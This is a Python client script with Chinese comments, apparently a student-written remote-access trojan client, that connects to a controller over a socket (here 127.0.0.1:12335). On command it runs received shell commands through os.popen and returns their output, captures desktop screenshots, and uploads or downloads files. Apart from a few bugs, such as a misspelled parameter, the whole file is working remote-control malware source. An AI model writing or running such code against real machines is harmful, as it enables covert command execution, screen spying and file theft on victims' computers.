import socket
import threading
import os
from PIL import ImageGrab
import  time
import base64
from Crypto import Random
from Crypto.Cipher import AES


#截图桌面
def send_photo (client_sock,cmd):
    # image d:\
    obj = ImageGrab.grab()
    obj.save("desk.jpg")  #存储到当前文件夹下
    #传输到 服务器端
    file_size = os.path.getsize("desk.jpg")
    tmp= file_size % MAX_SEND_SIZE
    if tmp:
        count = file_size // MAX_SEND_SIZE +1
    else:
        count = file_size // MAX_SEND_SIZE
    path_send = f"download_file desk.jpg {cmd[-1]} {str(count)}"
    # download desk.jpg d:\ 2
    #把命令发送过去
    sock.send(path_send.encode())

    #读取文件内容并发送
    file = open("desk.jpg",'rb')
    for i in range(count):
        data =file.read(MAX_SEND_SIZE)
        sock.send(data)
    file.close()
    os.unlink("desk.jpg")
    # client_sock.send('图片传输完成'.encode())

#上传文件
MAX_SEND_SIZE =1024
def recv_upload(client_sock,cmd):
    # upload_file 1.txt d:\ 3
    #验证上传的目录是否存在，如果不存在就获取当前目录并写入
    file_dir =cmd[2]
    if not os.path.exists(file_dir):
        file_dir =os.getcwd()
    #接收文件大小计算次数
    file_size = int(cmd[3])
    #写入内容
    path = os.path.join(file_dir,cmd[1])
    file = open(path,'wb')
    for i in range(file_size):
        data = client_sock.recv(1024)
        file.write(data)
    file.close()
    client_sock.send("上传成功".encode())



#下载文件
def recv_download(client_sock,cmd):
    #upload 1.txt d:\
    #验证命令完整性
    if len(cmd) != 3:
        print('命令错误，请输入help查看命令详情')
        return
    #验证文件是否存在
    if not os.path.exists(cmd[1]):
        print('文件不存在，请检查文件')
        return
    #读文件，发送刚上传文件命令
    #先获取文件大小，计算发送次数
    file_size = os.path.getsize(cmd[1])
    #计算数据发送次数
    tmp= file_size % MAX_SEND_SIZE
    if tmp:
        count = file_size // MAX_SEND_SIZE +1
    else:
        count =file_size // MAX_SEND_SIZE
    #把命令发送过去
    tmp = ' '.join(cmd)+' '+str(count)
    print(tmp)
    client_sock.send(tmp.encode())
    #读取文件内容并发送
    file = open(cmd[1],'rb')
    for i in range(count):
        data =file.read(MAX_SEND_SIZE)
        client_sock.send(data)
    file.close()



#解析收到的命令
def recv_client_msg(client_sock):
    while True:
        # recv 返回值是字节串-记得解码

        cmd =client_sock.recv(1024).decode()
        cmd =cmd.split(" ")  #分割
        print(f'cmd={cmd}')
        #如果结果为空，说明对方断开了连接
        if not cmd :
            break
        #如果是执行上传文件命令

        if cmd[0] == 'upload_file':
            recv_upload(client_sock,cmd)
        elif cmd[0] == "os-shell":
            os_shell(client_sock)
        elif cmd[0] == 'image':
            send_photo(client_sock,cmd)
        elif cmd[0] == 'download_file':
            recv_download(client_sock,cmd)

        print(cmd[0])



#客户端处理命令函数
def os_shell(ckient_sock):
    #执行系统命令并发送到服务器
    while True:
        cmd = client_sock.recv(1024).decode()
        "dir"
        #tmp =cmd.split()[0]
        #dir d:\
        #退出命令行
        if cmd == 'exit':
            break
        tmp =cmd.split(" ")
        #tmp 内容 [?,?]
        #如果cd命令，需要主动切换目录
        if tmp[0] =='cd':
            os.chdir(tmp[2])
        else:
            data = os.popen(cmd).read()
            sock.send(data.encode())


# #接收来自服务器的命令
# def recv_client_msg(sock):
#     while True:
#         #recv返回值是字节串类型
#         cmd =sock.recv(1024).decode()
#         # upload_file 2.txt
#         # [upload_file, 2.txt]
#         cmd =cmd.split(" ")#收到的命令用空格分隔并存储为列表
#         #如果结果为空，说明对方断开连接 了
#         if not cmd:
#             break
#         elif cmd[0] == 'upload':
#             upload_file(cmd)
#         elif cmd[0]  =='help':
#             print('下载：download  上传：upload  ')
#
#         print(cmd[0])

#创建套接字
sock = socket.socket()
client_sock = sock
#等待连接
sock.connect(('127.0.0.1',12335))
#创建线程发送来的消息
t= threading.Thread(target=recv_client_msg,args=(sock,))
t.start()
#给服务器发消息
while True:
    data = input('请输入要发送的内容>>>')
    if data == 'exit':
        print('本机断开连接')
        break
    sock.send(data.encode())
#关闭套接字
sock.close()